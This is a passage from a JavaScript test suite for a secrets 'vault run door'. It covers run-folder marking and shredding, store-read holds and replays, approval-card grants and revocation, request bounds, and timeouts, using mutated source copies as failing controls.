      const at1 = { dMark: fs.existsSync(path.join(d, DOOR.OWNER_FILE)), dF1: fs.existsSync(path.join(d, 'f1')), dF0: fs.existsSync(path.join(d, 'f0')), sMark: fs.existsSync(path.join(sd, DOOR.OWNER_FILE)), sDeep: fs.existsSync(path.join(sd, 'made-by-the-program', 'deeper', 'x')), sF0: fs.existsSync(path.join(sd, 'f0')), odGone: !fs.existsSync(od), odCopy: fs.existsSync(path.join(od, 'made-by-the-program', 'copy-of-f0')), copyOverwritten, outsideKept: fs.readFileSync(outside, 'utf8') === 'keep me' };
      const n2 = w.door.sweep();   // the next start: the unlink works again
      return { refused, n1, at1, n2, dGone: !fs.existsSync(d), sMark2: fs.existsSync(path.join(sd, DOOR.OWNER_FILE)) };
    };
    const lf = await leftOf(DOOR);
    ok(lf.refused === 1 && lf.n1 === 3 && lf.at1.dMark && lf.at1.dF1 && !lf.at1.dF0 && lf.at1.sMark && lf.at1.sDeep && !lf.at1.sF0 && lf.at1.odGone && lf.at1.copyOverwritten && lf.at1.outsideKept && lf.n2 === 2 && lf.dGone && lf.sMark2,
      'r1213 (a) + r1275 (2): the mark is shredded only when NOTHING ELSE is left — a file whose unlink failed, or what the program left two levels down, keeps its folder MARKED (its other value files gone) and the next start\'s sweep judges it again; a value copied ONE level down is OVERWRITTEN and unlinked with its sub-folder (a link inside it never followed: the file it names kept), and that folder is gone', lf);
    const anyLeft = M.load('src/server/vault-run-door.js', anchored(SRCs, LEFT_LINE, MARK_ANY, 'test-vault-run ⑥b r1213 mark-with-something-left'), 'r1213-mark-any');
    const lfR = anyLeft ? await leftOf(anyLeft) : null;
    ok(!!anyLeft && lfR && lfR.refused === 1 && lfR.at1.dF1 && !lfR.at1.dMark && lfR.at1.sDeep && !lfR.at1.sMark && lfR.n2 === 0 && !lfR.dGone,
      'RED — the r1152 line (the mark shredded whatever is left; its plant proves itself: one unlink was refused): the folders are left UNMARKED with something in them, and the next sweep never judges them again — the leg above goes red there', lfR);
    const flat = M.load('src/server/vault-run-door.js', anchored(SRCs, FOR_LINE, "  for (const n of names) if (n !== OWNER_FILE) shredFile(path.join(dir, n));\n", 'test-vault-run ⑥b r1275 no level down'), 'r1275-flat');   // stale-pins: kept (the r1213 loop: this RED's replacement)
    const lfF = flat ? await leftOf(flat) : null;
    ok(!!flat && lfF && lfF.at1.odCopy && !lfF.at1.odGone, 'RED — r1213\'s loop (no level down; its plant proves itself: the copy was written): the value copied one level down STAYS, its folder kept marked for ever — the leg above goes red there', lfF && lfF.at1);
  }
  // THE ORDER THE LAW STANDS ON (pinned): in a run folder the door's mark is the FIRST file made — before any value file — so a
  // folder with no mark never holds a value of the door's. Every O_CREAT open under the world's run root is recorded
  {
    const orderOf = async (doorMod) => {
      const ow = await world({ doorMod });
      openRow(ow);
      const made = [], under = (p) => { try { return String(p).startsWith(ow.runRoot + path.sep); } catch { return false; } };
      const creates = (flags) => (typeof flags === 'number' ? !!(flags & fs.constants.O_CREAT) : /[wax]/.test(String(flags == null ? 'r' : flags)));
      const saved = { openSync: fs.openSync, writeFileSync: fs.writeFileSync, copyFileSync: fs.copyFileSync, renameSync: fs.renameSync, mkdirSync: fs.mkdirSync };   // every road a file is made by
      fs.openSync = function (p, flags, ...rest) { if (under(p) && creates(flags)) made.push(path.basename(String(p))); return saved.openSync.call(this, p, flags, ...rest); };
      fs.writeFileSync = function (p, ...rest) { if (under(p)) made.push(path.basename(String(p))); return saved.writeFileSync.call(this, p, ...rest); };
      fs.copyFileSync = function (a, b, ...rest) { if (under(b)) made.push(path.basename(String(b))); return saved.copyFileSync.call(this, a, b, ...rest); };
      fs.renameSync = function (a, b, ...rest) { if (under(b)) made.push(path.basename(String(b))); return saved.renameSync.call(this, a, b, ...rest); };
      let r = null;
      try { ({ r } = await runAnswered(ow, ['--file', 'T=vault://mounts/m1/secretKey', '--', NODE, PRINTER, 'ran', path.join(ow.work, 'ran.txt')])); } finally { Object.assign(fs, saved); }
      return { ok: !!(r && r.ok), code: r && r.code, made };
    };
    const real = await orderOf(DOOR);
    ok(real.ok && real.made[0] === DOOR.OWNER_FILE && real.made.includes('f0') && real.made.indexOf(DOOR.OWNER_FILE) < real.made.indexOf('f0'),
      'r1152: the order the law stands on — a run folder\'s FIRST file is the door\'s mark (.owner), then its value file (f0): a folder with no mark holds no value of the door\'s', real);
    const SRCo = fs.readFileSync(path.join(REPO, 'src/server/vault-run-door.js'), 'utf8');
    const MARK_W = "      try { const mb = Buffer.from(JSON.stringify(hubIdentity || { pid: process.pid })), wrote = fs.writeSync(ofd, mb); if (wrote !== mb.length) throw Object.assign(new Error(`the owner mark was written short (${wrote} of ${mb.length} bytes)`), { code: 'ESHORTMARK' }); } finally { fs.closeSync(ofd); }   // r1213 (b): a SHORT write is a failed mark — the run stops before any value file and its folder is shredded, as a thrown write is\n";   // the mark's CHECKED write (r1213 b)
    const OWN2 = "      const ofd = fs.openSync(path.join(dir, OWNER_FILE), fs.constants.O_WRONLY | fs.constants.O_CREAT | fs.constants.O_EXCL | (fs.constants.O_NOFOLLOW || 0), 0o600);\n" + MARK_W;
    const late = M.load('src/server/vault-run-door.js', anchored(anchored(SRCo, OWN2, '', 'test-vault-run ⑥b r1152 mark-late (cut)'), '      const rec = { conv: caller.conversationId', "      { const ofd = fs.openSync(path.join(dir, OWNER_FILE), fs.constants.O_WRONLY | fs.constants.O_CREAT | fs.constants.O_EXCL | (fs.constants.O_NOFOLLOW || 0), 0o600); try { fs.writeSync(ofd, JSON.stringify(hubIdentity || { pid: process.pid })); } finally { fs.closeSync(ofd); } }\n      const rec = { conv: caller.conversationId", 'test-vault-run ⑥b r1152 mark-late (after)'), 'r1152-mark-late');
    const lateR = await orderOf(late);
    ok(lateR.ok && lateR.made.includes(DOOR.OWNER_FILE) && lateR.made.includes('f0') && lateR.made.indexOf('f0') < lateR.made.indexOf(DOOR.OWNER_FILE), 'RED — a door that writes a VALUE file before its mark (an anchored copy: the mark moved after the files; its run still runs — the plant is where it claims): the order leg above goes red there', lateR);
    // r1213 (b): THE MARK'S WRITE IS CHECKED — a SHORT write (fewer bytes than the mark) is a failed mark: the run stops before
    // any value file, nothing runs, and its folder is shredded, as a thrown write is
    const shortOf = async (doorMod) => {
      const ow = await world({ doorMod });
      openRow(ow);
      const under = (q) => { try { return String(q).startsWith(ow.runRoot + path.sep); } catch { return false; } };
      const saved = { openSync: fs.openSync, writeSync: fs.writeSync };
      let markFd = null, shorts = 0;
      let armed = true;   // only the MARK's write is made short: the shred that follows reopens the torn .owner to overwrite it (the round's must)
      fs.openSync = function (q, ...rest) { const fd = saved.openSync.call(this, q, ...rest); if (armed && under(q) && path.basename(String(q)) === DOOR.OWNER_FILE) { markFd = fd; armed = false; } return fd; };
      fs.writeSync = function (fd, buf, ...rest) { if (markFd != null && fd === markFd) { markFd = null; shorts++; const b = Buffer.isBuffer(buf) ? buf : Buffer.from(String(buf)); return saved.writeSync.call(this, fd, b, 0, Math.max(0, b.length - 1)); } return saved.writeSync.call(this, fd, buf, ...rest); };
      const ran = path.join(ow.work, 'ran-short.txt');
      let r = null;
      try { ({ r } = await runAnswered(ow, ['--file', 'T=vault://mounts/m1/secretKey', '--', NODE, PRINTER, 'ran', ran])); } finally { Object.assign(fs, saved); }
      return { shorts, ok: !!(r && r.ok), code: r && r.code, ran: fs.existsSync(ran), dirs: runDirs(ow).length };
    };
    const sh = await shortOf(DOOR);
    ok(sh.shorts === 1 && !sh.ok && sh.code === 'spawn_failed' && !sh.ran && sh.dirs === 0, 'r1213 (b): the mark\'s write is CHECKED — a write one byte short is a failed mark: spawn_failed, nothing ran, no run folder left', sh);
    const unchecked = M.load('src/server/vault-run-door.js', anchored(SRCo, MARK_W, "      try { fs.writeSync(ofd, JSON.stringify(hubIdentity || { pid: process.pid })); } finally { fs.closeSync(ofd); }\n", 'test-vault-run ⑥b r1213 mark-unchecked'), 'r1213-mark-unchecked');   // stale-pins: kept (the release's unchecked write is this RED's replacement — gone from the door on purpose)
    const shR = unchecked ? await shortOf(unchecked) : null;
    ok(!!unchecked && shR && shR.shorts === 1 && shR.ok && shR.ran, 'RED — the unchecked write (the release\'s line; its plant proves itself: the mark was written short): the run GOES over a torn mark — the leg above goes red there', shR);
  }
  // r1152 (A — the suites' hygiene) + r1213 (THE CLASS): NO SUITE'S SCRATCH WEARS A NAME A PRODUCT SWEEPER OWNS, AND NO PRODUCT
  // SWEEPER IS OFF THE TABLE. src/temp-sweepers.js is the product's table of every file that removes folders under the temp root
  // by a name prefix; the scratch helper refuses each row's prefix by READING it. This census holds (1) every src file that
  // sweeps by such a prefix to a row, and every row to a live sweep whose exported constant IS the row's prefix; (2) the refusal
  // of every row through each door into scratch(); (3) no tracked script asking for a row's shape — a scratch / scratchDir /
  // mutantCopies name, or a mkdtemp under the temp folder. Each half has its RED over a planted text
  {
    const SCR = await import(pathToFileURL(path.join(REPO, 'scripts/scratch.mjs')).href);
    const GE = await import(pathToFileURL(path.join(REPO, 'scripts/git-env.mjs')).href);   // the tree's git env (a caller's GIT_DIR never steers the census)
    const FG = R('src/fixture-guard.js'), TS = R('src/temp-sweepers.js');
    const MCm = await import(pathToFileURL(path.join(REPO, 'scripts/mutant-copy.mjs')).href);
    const refusedBy = (fn) => { try { fn(); return null; } catch (e) { return String(e.message || e); } };
    const problems = [];
    const lsOf = (globs) => { try { return require('child_process').execFileSync('git', ['ls-files', '--', ...globs], { cwd: REPO, encoding: 'utf8', env: GE.gitEnvFrom(process.env) }).split('\n').filter(Boolean); } catch (e) { problems.push(`git ls-files failed: ${String((e && e.message) || e).slice(0, 120)}`); return []; } };
    const textsOf = (rels) => rels.map((rel) => [rel, fs.readFileSync(path.join(REPO, rel), 'utf8')]);
    // (1) THE PRODUCT SIDE: a file sweeps by a prefix when it tests names with startsWith(<a 'vs-<word>-' prefix>) — a literal or a
    // const of its own — AND removes something; every such (file, prefix) is a row, every row is such a pair, the row's `export`
    // is the file's const of that very prefix and is exported
    const FOLDER_PREFIX = /^vs-[a-z0-9]+(?:-[a-z0-9]+)*-$/;
    const REMOVES = /\b(?:rmSync|rmdirSync|unlinkSync|shredDir|removeMarked)\(|\bfsp?\.rm\(|\bfs\.promises\.rm\(/;
    const constOf = (text, id) => { const d = new RegExp(`\\bconst\\s+${id}\\s*=\\s*(['"\`])([^'"\`]*)\\1`).exec(text); return d ? d[2] : null; };
    const sweepsOf = (text) => {
      if (!REMOVES.test(text)) return [];
      const out = new Set();
      for (const m of text.matchAll(/\.startsWith\(\s*(?:(['"`])([^'"`]*)\1|([A-Za-z_$][\w$]*))\s*\)/g)) { const v = m[2] != null ? m[2] : constOf(text, m[3]); if (v != null && FOLDER_PREFIX.test(v)) out.add(v); }
      return [...out];
    };
    const productCensus = (files, rows) => {
      const bad = [], found = new Map();
      for (const [rel, text] of files) { const ps = sweepsOf(text); if (ps.length) found.set(rel, { ps, text }); }
      for (const [rel, { ps }] of found) for (const pf of ps) if (!rows.some((r) => r.file === rel && r.prefix === pf)) bad.push(`${rel} sweeps «${pf}…» and is no row of src/temp-sweepers.js`);
      for (const r of rows) {
        const f = found.get(r.file);
        if (!f || !f.ps.includes(r.prefix)) { bad.push(`row ${r.file} «${r.prefix}» names no live sweep (a dead row)`); continue; }
        if (constOf(f.text, r.export) !== r.prefix || !new RegExp(`module\\.exports\\s*=\\s*\\{[^}]*\\b${r.export}\\b`).test(f.text)) bad.push(`row ${r.file}: its exported ${r.export} is not «${r.prefix}»`);
        if (!r.prefix.startsWith(FG.FIXTURE_CWD_PREFIX) || !String(r.proof || '').trim()) bad.push(`row ${r.file}: no proof, or a prefix scratch could never mint`);
      }
      return bad;
    };
    const SRC_FILES = textsOf(lsOf(['src/*.js', 'server.js']));
    const prodBad = productCensus(SRC_FILES, TS.ROWS);
    const plantSweep = productCensus([...SRC_FILES, ['src/server/planted-sweeper.js', "const P = 'vs-planted-x-';\nfor (const f of names) if (f.startsWith(P)) fs.rmSync(path.join(root, f), { recursive: true });\nmodule.exports = { P };\n"]], TS.ROWS);
    const plantDead = productCensus(SRC_FILES, [...TS.ROWS, { file: 'src/server/gone-sweeper.js', export: 'P', prefix: 'vs-gone-x-', proof: 'a plant' }]);
    ok(SRC_FILES.length > 500 && TS.ROWS.length === 3 && !prodBad.length && plantSweep.length === 1 && /planted-sweeper\.js sweeps «vs-planted-x-…» and is no row/.test(plantSweep[0]) && plantDead.length === 1 && /gone-sweeper\.js «vs-gone-x-» names no live sweep/.test(plantDead[0]),
      'r1213 (THE CLASS, the product side): every src file that removes folders by a vs-<word>- name prefix is a row of src/temp-sweepers.js (the vault run door, the sign-in card\'s scratch, the token mint\'s), each row a live sweep whose exported prefix IS the row\'s — RED: a planted sweeper off the table is named, a planted dead row is named', { files: SRC_FILES.length, rows: TS.ROWS.map((r) => r.prefix), prodBad, plantSweep, plantDead });
    // (2) THE REFUSAL, read from the table: every row through scratch(), a copies folder, scratchDir() and mutantCopies()
    const refusals = TS.ROWS.map((r) => {
      const nm = r.prefix.slice(FG.FIXTURE_CWD_PREFIX.length, -1);
      const said = [refusedBy(() => SCR.scratch(nm)), refusedBy(() => SCR.scratch(nm + '-mut')), refusedBy(() => SCR.scratchDir(nm + '-x')), refusedBy(() => MCm.mutantCopies(nm, REPO))];
      return { row: r.file, nm, ok: said.every((w) => w && w.includes(`the folder shape of ${r.file}`) && w.includes(`/tmp/${r.prefix}`)) };
    });
    const passes = refusedBy(() => SCR.scratch('vaultrun-census-probe')) === null && SCR.sweeperRowOf('oat') === null && SCR.sweeperRowOf('signincard') === null;
    const planted = SCR.sweeperRowOf('zz-planted', [...TS.ROWS, { file: 'src/server/planted.js', prefix: 'vs-zz-planted-' }]);
    ok(refusals.every((x) => x.ok) && passes && planted && planted.file === 'src/server/planted.js' && SCR.sweeperRowOf('zz-planted') === null,
      'r1152 (A) + r1213: the scratch helper REFUSES, by reading the table, a name that would mint ANY row\'s folder shape — through scratch(), a copies folder (<name>-mut), scratchDir() and mutantCopies(); a name beside a row\'s (oat, signincard, vaultrun…) passes — RED: a row planted in the table is refused, the same name without it passes', { refusals, passes, planted: planted && planted.file });
    // (3) THE SUITES: no tracked script asks for a row's shape — a scratch / scratchDir / mutantCopies name (a copies folder is
    // <name>-mut), or a mkdtemp under the temp folder (path.join(os.tmpdir(), '<lit>'), os.tmpdir() + '/<lit>')
    const scriptsCensus = (files, rows) => {
      const bad = [];
      for (const [rel, t] of files) {
        for (const m of t.matchAll(/\b(scratchDir|scratch|mutantCopies)\(\s*(['"`])([a-z0-9-]+)\2/g)) { const names = m[1] === 'mutantCopies' ? [m[3], m[3] + '-mut'] : [m[3]]; for (const nm of names) { const r = SCR.sweeperRowOf(nm, rows); if (r) bad.push(`${rel}: ${m[1]}('${m[3]}') wears ${r.prefix}…`); } }
        for (const m of t.matchAll(/mkdtemp(?:Sync)?\(\s*(?:path\.join\(\s*(?:os\.)?tmpdir\(\)\s*,\s*|(?:os\.)?tmpdir\(\)\s*\+\s*)(['"`])\/?([^'"`$]+)\1/g)) { const r = TS.rowOfName(m[2], rows); if (r) bad.push(`${rel}: mkdtemp '${m[2]}' wears ${r.prefix}…`); }
      }
      return bad;
    };
    const SCRIPT_FILES = textsOf(lsOf(['scripts/*.mjs', 'scripts/*.cjs', 'scripts/*.js']));
    const scrBad = scriptsCensus(SCRIPT_FILES, TS.ROWS);
    const SIGN = ['sign', 'in'].join('');   // built at run time: the census reads LITERALS, and these plants are its own
    const plantScr = scriptsCensus([['scripts/test-planted.mjs', `const a = scratch('${SIGN}-x');\nconst b = fs.mkdtempSync(path.join(os.tmpdir(), 'vs-oat-${'mint'}-y-'));\n`]], TS.ROWS);
    ok(SCRIPT_FILES.length > 100 && !problems.length && !scrBad.length && plantScr.length === 2 && plantScr.some((l) => /scratch\('signin-x'\) wears vs-signin-/.test(l)) && plantScr.some((l) => /mkdtemp 'vs-oat-mint-y-' wears vs-oat-mint-/.test(l)),
      'r1152 (A) + r1213: no tracked script asks for a row\'s shape — no scratch / scratchDir / mutantCopies name and no mkdtemp under the temp folder (test-signin-card-ui\'s folder renamed) — RED: a planted scratch(\'signin-…\') and a planted mkdtemp of vs-oat-mint-… are each named', { scripts: SCRIPT_FILES.length, problems, scrBad, plantScr });
  }
  try { liveKid.kill('SIGKILL'); } catch { }
  // THE STORE'S MARK: a non-hex mark reads as empty (never a throw); a restored OLDER copy is a replay
  const mw = await world();
  openRow(mw);
  const FILE = path.join(mw.dataDir, DOOR.STORE_FILE);
  const good = fs.readFileSync(FILE, 'utf8');
  const g = JSON.parse(good);
  fs.writeFileSync(FILE, JSON.stringify({ ...g, mark: 'é'.padStart(64, 'a') }));
  let threw = null, r1 = null;
  try { r1 = await mw.mk().run({ caller: mw.caller, args: ENV('env'), cwd: mw.work }); } catch (e) { threw = e.message; }
  ok(!threw && r1.code === 'entry_not_runnable', 'a mark that is not 64 hex characters (é: the same length in JS, not in bytes) reads as EMPTY — never a throw that breaks every door', threw || r1.code);
  fs.writeFileSync(FILE, good);
  const d2 = mw.mk();
  d2.setRunnable({ id: 'app-secrets:app1#item.0.1', on: true, reauthed: true });   // a newer generation, read and written by this hub
  fs.writeFileSync(FILE, good);   // the older copy restored
  await mw.vault.lock('door'); await mw.vault.unlock(PW);
  const r2 = await d2.run({ caller: mw.caller, args: ENV('env'), cwd: mw.work });
  ok(r2.code === 'entry_not_runnable' && /a replay/.test(auditOf(mw)), 'a restored OLDER copy of the store (a generation below the one this hub wrote) is a REPLAY: read as empty, said in the audit', r2.code);
  // switch-off takes the entry's «always» back
  const aw = await world();
  openRow(aw);
  const CA = ['--env', 'T=vault://mounts/m1/secretKey', '--', 'curl', '-s', 'https://api.example.com/v1/a'];
  const c1 = await runAnswered(aw, CA, { answer: 'always', reauthed: true });
  const c2 = await runAnswered(aw, CA);
  aw.door.setRunnable({ id: 'mounts:m1#secretKey', on: false });
  openRow(aw);
  const c3 = await runAnswered(aw, CA, { answer: 'deny' });
  ok(c1.r.by === 'always' && c2.r.by === 'always' && !c2.card && !!c3.card && c3.r.code === 'ask_denied', 'switching the entry OFF takes back its «always» (and its seen shapes): switched on again, the same shape asks', [c1.r.by, c2.r.by, !!c3.card]);
  { // r6 (主开发: «a card's state follows the grant's life» — the Always + a revoke in the Vault window ⇒ the card says revoked)
    const FAr = R('src/foryou-actions.js');
    const ia = aw.userTodos.get(c1.card && c1.card.id), sa = ia && FAr.decidedStamp(ia);
    ok(ia && ia.resolvedBy === 'always' && ia.resolvedFact?.alwaysFor === '30d' && ia.resolvedFact?.endedBy === 'revoked' && sa && /^always allowed · revoked (\d+\/\d+ )?\d\d:\d\d$/.test(sa.text) && FAr.decisionCard(ia).state === 'revoked', 'r6: the run card\'s «Always» record carries its grant (alwaysFor, until); the entry switched OFF in the Vault window ⇒ the card says «always allowed · revoked HH:MM» (was: «always allowed by you» for ever)', { fact: ia && ia.resolvedFact, stamp: sa && sa.text });
    const a8 = await world(); openRow(a8);
    const c8 = await runAnswered(a8, CA, { answer: 'always', reauthed: true, ttl: '8h' });
    await a8.vault.lock('agent');
    const i8 = a8.userTodos.get(c8.card && c8.card.id), s8 = i8 && FAr.decidedStamp(i8);
    ok(c8.r.by === 'always' && i8 && i8.resolvedFact?.alwaysFor === '8h' && i8.resolvedFact?.endedBy === 'lock' && s8 && /^always allowed · ended /.test(s8.text) && FAr.decisionCard(i8).state === 'ended', 'r6: an 8-hour «Always» then a LOCK ⇒ its card «always allowed · ended HH:MM» at once', { fact: i8 && i8.resolvedFact, stamp: s8 && s8.text });
  }
  // the bounds, the folder's characters, the program on the card
  const big = await aw.door.run({ caller: aw.caller, args: ['--env', 'P=' + 'a.'.repeat(40000), '--env', 'T=vault://mounts/m1/secretKey', '--', 'curl', 'https://api.example.com'], cwd: aw.work });
  const bigCwd = await aw.door.run({ caller: aw.caller, args: ENV('env'), cwd: '/tmp/' + 'a/'.repeat(3000) });
  const rlo = await aw.door.run({ caller: aw.caller, args: ENV('env'), cwd: aw.work + '/\u202e' });
  ok(big.code === 'request_too_large' && bigCwd.code === 'request_too_large' && rlo.code === 'hidden_chars', 'over 64 KiB of words or a 4 KiB folder ⇒ request_too_large before anything is read; a folder holding a direction mark ⇒ hidden_chars (the card prints the folder)', [big.code, bigCwd.code, rlo.code]);
  const wc = await runAnswered(aw, ['--env', 'T=vault://mounts/m1/secretKey', '--', WCURL, '-s', 'https://api.example.com/v1/a'], { answer: null });
  ok(!!wc.card && wc.card.action.always === false && new RegExp('Program: ' + WCURL.replace(/[.*+?^${}()|[\]\\]/g, '\\$&') + ' — in a folder an agent can write').test(wc.card.detail) && /«Always» is not offered: the program sits where an agent could have written it/.test(wc.card.detail), 'the card names the PROGRAM that runs (its real path); one an agent could have written (a folder it can write) is said and gets no «always»', wc.card && wc.card.detail);
  aw.door.answer(wc.card.action.askId, { answer: 'deny' }); await wc.r;
  const ok1 = await runAnswered(aw, CA, { answer: null });
  ok(!!ok1.card && new RegExp('Program: ' + CURL.replace(/[.*+?^${}()|[\]\\]/g, '\\$&') + '\n').test(ok1.card.detail + '\n'), 'a program in a folder no agent can write: its path on the card, no warning', ok1.card && ok1.card.detail.split('\n').slice(0, 3));
  aw.door.answer(ok1.card.action.askId, { answer: 'deny' }); await ok1.r;
  aw.door.setRunnable({ id: "mounts:b(x)!'*#secretKey", on: true, reauthed: true });
  const ls = aw.door.runnableFor();
  ok(ls.ok && ls.entries.some((e) => e.ref === "vault://mounts/b%28x%29%21%27%2A/secretKey") && ls.entries.every((e) => VR.parseRef(e.ref)), 'list spells every opened entry as a reference that parses — an entry name holding !\'()* too', ls.entries.map((e) => e.ref));
}

console.log('⑥ THE TIMEOUT');
{
  const w = await world();
  openRow(w);
  const { r } = await runAnswered(w, ['--timeout', '1', ...ENV('sleep', path.join(w.work, 'p2.txt'))]);
  ok(r.ok && r.timedOut === true && r.signal === 'SIGTERM' && w.timerLog.includes(1000), '--timeout 1: the door armed its 1 s bound, the child was stopped there (SIGTERM) and the answer says timedOut', { timedOut: r.timedOut, signal: r.signal, timers: w.timerLog });
}

console.log('⑥c THE STORE READ (主开发 r2920) — a read of data/vault-run.json that FAILED is no state: the store is HELD, never written over');
{
  // the failed reads are PLACED (never a real mount): the store's open fails as the test says, then the file reads as it is
  const fileOf = (w) => path.join(w.dataDir, DOOR.STORE_FILE);
  // the red controls' edits (each anchor counted once in the door): a door with no hold asked, today's order (r3147: asked, then loaded)
  const NO_HOLD_SWITCH = [["    const o = ownerLoad(); if (o.held) return o.held;   // 主开发 r3147 (1): THE ONE DOOR — loaded, then the hold asked, before anything is taken back or touched", "    const o = { d: load() };"], ["    { const h = heldNow(); if (h) return h; }   // 主开发 r2920: the store is HELD (or its torn bytes' copy in flight) — refused BY NAME, nothing written over the unread file", '']];
  const NO_HOLD_PRESS = [["    const o = ownerLoad(); if (o.held) return o.held;   // 主开发 r3147 (1): THE ONE DOOR — the press's own load may SET the hold (torn bytes met again after a lift): loaded, THEN asked, before any snapshot or write", "    const o = { d: load() };"], ["    if (failCode === 'store_held' && touched.length === 1 && !made.length) return named('store_held', { why: storeHeld ? storeHeld.why : 'held' });   // 主开发 r3147 (2) / r3267 (2): the ONE early return — nothing was written, nothing to put back", '']];
  const NO_MARKS_ASKED = [["    { const m = marksHeldOf(); if (m) return m; }   // 主开发 r3255: the grants' marks held ⇒ refused by name beside the one door, before any snapshot or write (addMember would refuse AFTER this store's switch was written)", '']];
  const NO_HOLD_REVOKE = [["    const o = ownerLoad(); if (o.held) return o.held;   // 主开发 r3147 (1): THE ONE DOOR — never «done, 0» over approvals the unread file still holds", "    const o = { d: load() };"]];
  const TODAY_ORDER = [["  function ownerLoad({ carry = true } = {}) { const d = load({ carry }); const h = heldNow(); return h ? { held: h } : { d }; }", "  function ownerLoad({ carry = true } = {}) { const h = heldNow(); if (h) return { held: h }; return { d: load({ carry }) }; }"], ["    if (failCode === 'store_held' && touched.length === 1 && !made.length) return named('store_held', { why: storeHeld ? storeHeld.why : 'held' });   // 主开发 r3147 (2) / r3267 (2): the ONE early return — nothing was written, nothing to put back", '']];
  const placeSync = (file, codes) => { const real = fs.openSync; let k = 0; fs.openSync = function (p, ...x) { if (typeof p === 'string' && path.resolve(p) === path.resolve(file) && k < codes.length) { const code = codes[k++]; throw Object.assign(new Error(`placed ${code}`), { code }); } return real.call(this, p, ...x); }; return () => { fs.openSync = real; }; };
  const placeAsync = (file, codes) => { const real = fs.promises.open; let k = 0; fs.promises.open = function (p, ...x) { if (typeof p === 'string' && path.resolve(p) === path.resolve(file) && k < codes.length) { const code = codes[k++]; return Promise.reject(Object.assign(new Error(`placed ${code}`), { code })); } return real.call(this, p, ...x); }; return () => { fs.promises.open = real; }; };
  const suspendedOf = (w) => { try { return JSON.parse(fs.readFileSync(fileOf(w), 'utf8')).suspended || []; } catch { return null; } };
  const twoOff = (w) => { w.door.setRunnable({ id: 'mounts:m1#secretKey', on: false }); w.door.setRunnable({ id: 'mounts:m2#secretKey', on: false }); };
  const bothOff = (list) => !!(list && list.includes('mounts:m1#secretKey') && list.includes('mounts:m2#secretKey'));
  const SLOW = { storeRetry: { firstMs: 600000, maxMs: 600000, missingMs: 600000 } }, QUICK = { storeRetry: { firstMs: 15, maxMs: 30, missingMs: 15 } };
  const waitLift = async (d, ms = 3000) => { for (let k = 0; k < ms / 10 && d._storeHeld(); k++) await sleep(10); return !d._storeHeld(); };
  // (1) THE VERIFIER'S SCENE (lg-store-writes VR1): two entries OFF; the door's next life reads the store ONCE with an error; the
  // owner's next switch — refused BY NAME, the file not written over, both OFF switches still on disk
  const scene = async (doorMod) => {
    const w = await world({ doorMod }); twoOff(w);
    const undo = placeSync(fileOf(w), ['EIO']);
    let d, c;
    try { d = w.mk(doorMod, SLOW); c = d.setRunnable({ id: 'mounts:m2#secretKey', on: true, reauthed: true }); } finally { undo(); }
    return { code: c && c.code, said: !!(c && /HELD/.test(String(c.words))), kept: bothOff(suspendedOf(w)), held: !!d._storeHeld() };
  };
  const RELEASE_LOAD = ["    let read;\n    try { const b = readBounded(FILE, STORE_MAX); read = { text: b.toString('utf8'), buf: b }; } catch (e) { read = { error: e }; }\n    const a = lawOf(SR.storeAnswer(read, { valid: STORE_VALID }));\n    if (a === 'held') { next.refused = storeHeld.why; next.held = true; db = next; dbEpoch = vault.epoch(); return db; }\n    let raw = null, why = null;\n    if (a.state === 'data') raw = a.value;\n    else if (a.state === 'corrupt') {", "    let raw = null, why = null;\n    try { raw = JSON.parse(readBounded(FILE, STORE_MAX).toString('utf8')); } catch (e) { if (!(e && e.code === 'ENOENT')) why = `unreadable (${e.code || 'not JSON'})`; }\n    if (false) {"];   // stale-pins: kept (the replacement IS the release's load)
  const s1 = await scene(DOOR), s0 = await scene(doorCopy([RELEASE_LOAD], null, 'the release load (a failed read starts empty)'));
  ok(s1.code === 'store_held' && s1.said && s1.kept && s1.held && !s0.kept, `r2920 THE VERIFIER'S SCENE: a store read that failed ONCE at the door's next life HOLDS it — the owner's next switch is refused by name (store_held) and both OFF switches stay on disk; red control: «the release load (a failed read starts empty)» loses them`, { s1, s0 });
  // (2) A SWITCH REFUSED WHILE HELD — the window says it by name (its own words, zh / ja); red control: the save with no hold check
  const refusedLeg = async (doorMod) => {
    const w = await world({ doorMod }); twoOff(w);
    const undo = placeSync(fileOf(w), ['EIO']);
    let d, off, on;
    try { d = w.mk(doorMod, SLOW); off = d.setRunnable({ id: 'mounts:m1#secretKey', on: true, reauthed: true }); on = d.setRunnable({ id: 'mounts:m2#secretKey', on: false }); } finally { undo(); }
    return { codes: [off && off.code, on && on.code], kept: bothOff(suspendedOf(w)) };
  };
  const r1 = await refusedLeg(DOOR), r0 = await refusedLeg(doorCopy(NO_HOLD_SWITCH, null, 'a switch with no hold asked'));
  const winWords = fs.readFileSync(path.join(REPO, 'src/lib/vault-reveal.js'), 'utf8'), ZH = fs.readFileSync(path.join(REPO, 'src/lib/i18n-zh.js'), 'utf8'), JA = fs.readFileSync(path.join(REPO, 'src/lib/i18n-ja.js'), 'utf8');
  const KEY = "The vault's run settings could not be read just now, so nothing was changed. VibeSpace reads them again by itself: try again in a minute";
  ok(r1.codes.every((c) => c === 'store_held') && r1.kept && !r0.kept && winWords.includes("if (c === 'store_held') return t(") && ZH.includes(JSON.stringify(KEY).slice(0, 60)) && JA.includes(JSON.stringify(KEY).slice(0, 60)),
    'r2920 A SWITCH REFUSED WHILE HELD: an ON and an OFF are each refused by name (store_held), nothing written; the Vault window words the code (src/lib/vault-reveal.js, with zh / ja); red control: «a switch with no hold asked» (neither its door nor the save asks) writes over the file', { r1, r0 });
  // (3) THE LIFT WITHOUT A RESTART: the load's read fails, the first read again (off the loop) fails too, the next one reads — the hold
  // is lifted by itself, the owner's next switch lands, and every switch made before stands; red control: a read again that never lifts
  const liftLeg = async (doorMod) => {
    const w = await world({ doorMod }); twoOff(w);
    const undoS = placeSync(fileOf(w), ['EIO']), undoA = placeAsync(fileOf(w), ['ETIMEDOUT']);
    let d, held0, lifted, c;
    try { d = w.mk(doorMod, QUICK); held0 = !!(d.setRunnable({ id: 'mounts:m1#secretKey', on: true, reauthed: true }).code === 'store_held'); undoS(); lifted = await waitLift(d, 1500); c = d.setRunnable({ id: 'mounts:m1#secretKey', on: true, reauthed: true }); } finally { undoS(); undoA(); }
    const list = suspendedOf(w);
    return { held0, lifted, ok: !!(c && c.ok), m2Off: !!(list && list.includes('mounts:m2#secretKey')), m1On: !!(list && !list.includes('mounts:m1#secretKey')) };
  };
  const l1 = await liftLeg(DOOR), l0 = await liftLeg(doorCopy("    if (lawOf(a, { applied: false }) === 'held') return;", '    return;', 'a read again that never lifts'));
